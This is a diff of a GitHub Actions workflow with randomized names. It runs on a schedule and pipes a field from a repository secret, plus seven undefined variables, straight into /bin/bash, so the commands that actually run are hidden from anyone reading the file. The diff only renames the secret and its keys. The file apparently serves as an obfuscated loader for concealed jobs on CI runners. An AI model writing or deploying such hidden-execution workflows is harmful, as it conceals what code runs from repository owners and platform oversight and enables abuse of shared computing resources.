@@ -1,5 +1,4 @@
 name: hejintui9348
-
 on:
   workflow_dispatch:
   schedule:
@@ -8,19 +7,18 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hejintui9348
         env:
-          mf6255: ${{ secrets.mf6255 }}
+          b60: ${{ secrets.b60 }}
         run: |
-          echo $mf6255 | jq -r .z1209 | /bin/bash
-          echo $thrqn72144 | jq -r .uwsl05 | /bin/bash
-          echo $z08 | jq -r .m32 | /bin/bash
-          echo $dnn38020 | jq -r .vh0 | /bin/bash
-          echo $x45289 | jq -r .ga6 | /bin/bash
-          echo $ixq8 | jq -r .wbx2 | /bin/bash
-          echo $v38539 | jq -r .f111 | /bin/bash
-          echo $p5 | jq -r .aijc6809 | /bin/bash
+          echo $b60 | jq -r .e5 | /bin/bash
+          echo $jmmkw1 | jq -r .ke2 | /bin/bash
+          echo $wekn4 | jq -r .t5842 | /bin/bash
+          echo $hkhw6643 | jq -r .se651 | /bin/bash
+          echo $kau53807 | jq -r .cknkr20 | /bin/bash
+          echo $qhgss36 | jq -r .e54740 | /bin/bash
+          echo $wzqs70943 | jq -r .nocx74 | /bin/bash
+          echo $rkhdm0566 | jq -r .n679 | /bin/bash
 
